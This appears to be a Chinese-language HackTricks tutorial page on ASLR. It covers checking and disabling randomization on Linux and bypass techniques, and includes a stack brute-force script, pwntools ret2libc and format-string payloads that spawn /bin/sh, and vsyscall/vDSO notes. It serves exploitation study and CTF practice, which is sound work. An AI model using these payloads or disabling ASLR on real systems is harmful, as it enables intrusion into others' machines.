<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>ASLR</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="aslr"><a class="header" href="#aslr">ASLR</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<p><strong>地址空间布局随机化 (ASLR)</strong> 是一种在操作系统中使用的安全技术，用于 <strong>随机化系统和应用程序进程使用的内存地址</strong>。通过这样做，它使攻击者预测特定进程和数据（如堆栈、堆和库）的位置变得更加困难，从而减轻某些类型的攻击，特别是缓冲区溢出。</p>
<h3 id="检查-aslr-状态"><a class="header" href="#检查-aslr-状态"><strong>检查 ASLR 状态</strong></a></h3>
<p>要 <strong>检查</strong> Linux 系统上的 ASLR 状态，可以从 <strong><code>/proc/sys/kernel/randomize_va_space</code></strong> 文件中读取值。存储在此文件中的值决定了应用的 ASLR 类型：</p>
<ul>
<li><strong>0</strong>：没有随机化。一切都是静态的。</li>
<li><strong>1</strong>：保守随机化。共享库、堆栈、mmap()、VDSO 页面被随机化。</li>
<li><strong>2</strong>：完全随机化。除了保守随机化随机化的元素外，通过 <code>brk()</code> 管理的内存也被随机化。</li>
</ul>
<p>您可以使用以下命令检查 ASLR 状态：</p>
<pre><code class="language-bash">cat /proc/sys/kernel/randomize_va_space
</code></pre>
<h3 id="禁用-aslr"><a class="header" href="#禁用-aslr"><strong>禁用 ASLR</strong></a></h3>
<p>要<strong>禁用</strong> ASLR，您需要将 <code>/proc/sys/kernel/randomize_va_space</code> 的值设置为 <strong>0</strong>。在测试或调试场景之外，通常不建议禁用 ASLR。以下是禁用它的方法：</p>
<pre><code class="language-bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>您还可以通过以下方式禁用ASLR执行：</p>
<pre><code class="language-bash">setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
</code></pre>
<h3 id="启用-aslr"><a class="header" href="#启用-aslr"><strong>启用 ASLR</strong></a></h3>
<p>要<strong>启用</strong> ASLR，您可以将值 <strong>2</strong> 写入 <code>/proc/sys/kernel/randomize_va_space</code> 文件。这通常需要 root 权限。可以使用以下命令启用完全随机化：</p>
<pre><code class="language-bash">echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<h3 id="重启后的持久性"><a class="header" href="#重启后的持久性"><strong>重启后的持久性</strong></a></h3>
<p>使用 <code>echo</code> 命令所做的更改是临时的，并将在重启时重置。要使更改持久化，您需要编辑 <code>/etc/sysctl.conf</code> 文件，并添加或修改以下行：</p>
<pre><code class="language-tsconfig">kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
</code></pre>
<p>在编辑 <code>/etc/sysctl.conf</code> 后，使用以下命令应用更改：</p>
<pre><code class="language-bash">sudo sysctl -p
</code></pre>
<p>这将确保您的 ASLR 设置在重启后保持不变。</p>
<h2 id="绕过"><a class="header" href="#绕过"><strong>绕过</strong></a></h2>
<h3 id="32位暴力破解"><a class="header" href="#32位暴力破解">32位暴力破解</a></h3>
<p>PaX 将进程地址空间分为 <strong>3 组</strong>：</p>
<ul>
<li><strong>代码和数据</strong>（已初始化和未初始化）：<code>.text</code>、<code>.data</code> 和 <code>.bss</code> —&gt; <code>delta_exec</code> 变量中的 <strong>16 位</strong> 熵。该变量在每个进程中随机初始化，并添加到初始地址。</li>
<li>由 <code>mmap()</code> 分配的 <strong>内存</strong> 和 <strong>共享库</strong> —&gt; <strong>16 位</strong>，称为 <code>delta_mmap</code>。</li>
<li><strong>栈</strong> —&gt; <strong>24 位</strong>，称为 <code>delta_stack</code>。然而，它实际上使用 <strong>11 位</strong>（从第 10 字节到第 20 字节，包括），对齐到 <strong>16 字节</strong> —&gt; 这导致 <strong>524,288 个可能的真实栈地址</strong>。</li>
</ul>
<p>前面的数据适用于 32 位系统，减少的最终熵使得通过一次又一次地重试执行来绕过 ASLR 成为可能，直到利用成功完成。</p>
<h4 id="暴力破解思路"><a class="header" href="#暴力破解思路">暴力破解思路：</a></h4>
<ul>
<li>如果您有足够大的溢出以容纳 <strong>大 NOP sled 在 shellcode 之前</strong>，您可以在栈中暴力破解地址，直到流程 <strong>跳过 NOP sled 的某部分</strong>。</li>
<li>如果溢出不那么大，并且利用可以在本地运行，另一种选择是 <strong>在环境变量中添加 NOP sled 和 shellcode</strong>。</li>
<li>如果利用是本地的，您可以尝试暴力破解 libc 的基地址（对 32 位系统有用）：</li>
</ul>
<pre><code class="language-python">for off in range(0xb7000000, 0xb8000000, 0x1000):
</code></pre>
<ul>
<li>如果攻击远程服务器，您可以尝试 <strong>暴力破解 <code>libc</code> 函数 <code>usleep</code> 的地址</strong>，传递参数 10（例如）。如果在某个时刻 <strong>服务器响应多了 10 秒</strong>，您就找到了这个函数的地址。</li>
</ul>
<p>{% hint style="success" %}
在 64 位系统中，熵要高得多，这不应该是可能的。
{% endhint %}</p>
<h3 id="64-位栈暴力破解"><a class="header" href="#64-位栈暴力破解">64 位栈暴力破解</a></h3>
<p>可以用环境变量占用栈的大部分，然后尝试在本地数百/数千次滥用该二进制文件进行利用。<br />
以下代码显示了如何 <strong>仅选择栈中的一个地址</strong>，并且每 <strong>几百次执行</strong>，该地址将包含 <strong>NOP 指令</strong>：</p>
<pre><code class="language-c">//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include &lt;stdio.h&gt;

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
</code></pre>
<pre><code class="language-python">import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -&gt; " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
</code></pre>
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>
<h3 id="本地信息-procpidstat"><a class="header" href="#本地信息-procpidstat">本地信息 (<code>/proc/[pid]/stat</code>)</a></h3>
<p>进程的文件 <strong><code>/proc/[pid]/stat</code></strong> 始终对所有人可读，并且 <strong>包含有趣的</strong> 信息，例如：</p>
<ul>
<li><strong>startcode</strong> &amp; <strong>endcode</strong>: 二进制文件的 <strong>TEXT</strong> 上下的地址</li>
<li><strong>startstack</strong>: <strong>stack</strong> 开始的地址</li>
<li><strong>start_data</strong> &amp; <strong>end_data</strong>: <strong>BSS</strong> 上下的地址</li>
<li><strong>kstkesp</strong> &amp; <strong>kstkeip</strong>: 当前的 <strong>ESP</strong> 和 <strong>EIP</strong> 地址</li>
<li><strong>arg_start</strong> &amp; <strong>arg_end</strong>: <strong>cli arguments</strong> 上下的地址</li>
<li><strong>env_start</strong> &amp;<strong>env_end</strong>: <strong>env variables</strong> 上下的地址</li>
</ul>
<p>因此，如果攻击者与被利用的二进制文件在同一台计算机上，并且该二进制文件不期望来自原始参数的溢出，而是来自读取此文件后可以构造的不同 <strong>输入</strong>。攻击者可以 <strong>从此文件中获取一些地址并从中构造偏移量以进行利用</strong>。</p>
<p>{% hint style="success" %}
有关此文件的更多信息，请查看 <a href="https://man7.org/linux/man-pages/man5/proc.5.html">https://man7.org/linux/man-pages/man5/proc.5.html</a>，搜索 <code>/proc/pid/stat</code>
{% endhint %}</p>
<h3 id="有一个泄漏"><a class="header" href="#有一个泄漏">有一个泄漏</a></h3>
<ul>
<li><strong>挑战是提供一个泄漏</strong></li>
</ul>
<p>如果你得到了一个泄漏（简单的 CTF 挑战），你可以从中计算偏移量（假设例如你知道你正在利用的系统中使用的确切 libc 版本）。这个示例利用提取自 <a href="https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak"><strong>这里的示例</strong></a>（查看该页面以获取更多详细信息）：</p>
<pre><code class="language-python">from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
</code></pre>
<ul>
<li><strong>ret2plt</strong></li>
</ul>
<p>利用缓冲区溢出，可以利用 <strong>ret2plt</strong> 来提取 libc 中一个函数的地址。检查：</p>
<p>{% content-ref url="ret2plt.md" %}
<a href="ret2plt.html">ret2plt.md</a>
{% endcontent-ref %}</p>
<ul>
<li><strong>格式字符串任意读取</strong></li>
</ul>
<p>就像在 ret2plt 中一样，如果通过格式字符串漏洞有任意读取的能力，可以从 GOT 中提取 <strong>libc 函数</strong> 的地址。以下 <a href="https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got"><strong>示例来自这里</strong></a>:</p>
<pre><code class="language-python">payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
</code></pre>
<p>您可以在以下位置找到有关格式字符串任意读取的更多信息：</p>
<p>{% content-ref url="../../format-strings/" %}
<a href="../../format-strings/">format-strings</a>
{% endcontent-ref %}</p>
<h3 id="ret2ret--ret2pop"><a class="header" href="#ret2ret--ret2pop">Ret2ret &amp; Ret2pop</a></h3>
<p>尝试通过利用栈内的地址来绕过 ASLR：</p>
<p>{% content-ref url="ret2ret.md" %}
<a href="ret2ret.html">ret2ret.md</a>
{% endcontent-ref %}</p>
<h3 id="vsyscall"><a class="header" href="#vsyscall">vsyscall</a></h3>
<p><strong><code>vsyscall</code></strong> 机制通过允许某些系统调用在用户空间中执行来提高性能，尽管它们本质上是内核的一部分。<strong>vsyscalls</strong> 的关键优势在于它们的 <strong>固定地址</strong>，这些地址不受 <strong>ASLR</strong>（地址空间布局随机化）的影响。这种固定特性意味着攻击者不需要信息泄漏漏洞来确定它们的地址并在利用中使用它们。<br />
然而，这里不会找到超级有趣的小工具（尽管例如可以获得一个 <code>ret;</code> 等效指令）</p>
<p>（以下示例和代码来自 <a href="https://guyinatuxedo.github.io/15-partial_overwrite/hacklu15_stackstuff/index.html#exploitation"><strong>此写作</strong></a>）</p>
<p>例如，攻击者可能在利用中使用地址 <code>0xffffffffff600800</code>。虽然尝试直接跳转到 <code>ret</code> 指令可能会导致在执行几个小工具后不稳定或崩溃，但跳转到 <strong>vsyscall</strong> 部分提供的 <code>syscall</code> 开始处可能会成功。通过仔细放置一个 <strong>ROP</strong> 小工具，将执行引导到这个 <strong>vsyscall</strong> 地址，攻击者可以在不需要绕过 <strong>ASLR</strong> 的情况下实现代码执行。</p>
<pre><code>ef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  x.g &lt;pre&gt; 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g &lt;pre&gt; 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef➤  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef➤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef➤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
</code></pre>
<h3 id="vdso"><a class="header" href="#vdso">vDSO</a></h3>
<p>因此，请注意，如果内核是使用 CONFIG_COMPAT_VDSO 编译的，<strong>通过滥用 vdso 绕过 ASLR</strong> 可能是可行的，因为 vdso 地址不会被随机化。有关更多信息，请查看：</p>
<p>{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
<a href="../../rop-return-oriented-programing/ret2vdso.html">ret2vdso.md</a>
{% endcontent-ref %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../binary-exploitation/common-binary-protections-and-bypasses/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../binary-exploitation/common-binary-protections-and-bypasses/aslr/ret2plt.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../binary-exploitation/common-binary-protections-and-bypasses/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../binary-exploitation/common-binary-protections-and-bypasses/aslr/ret2plt.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
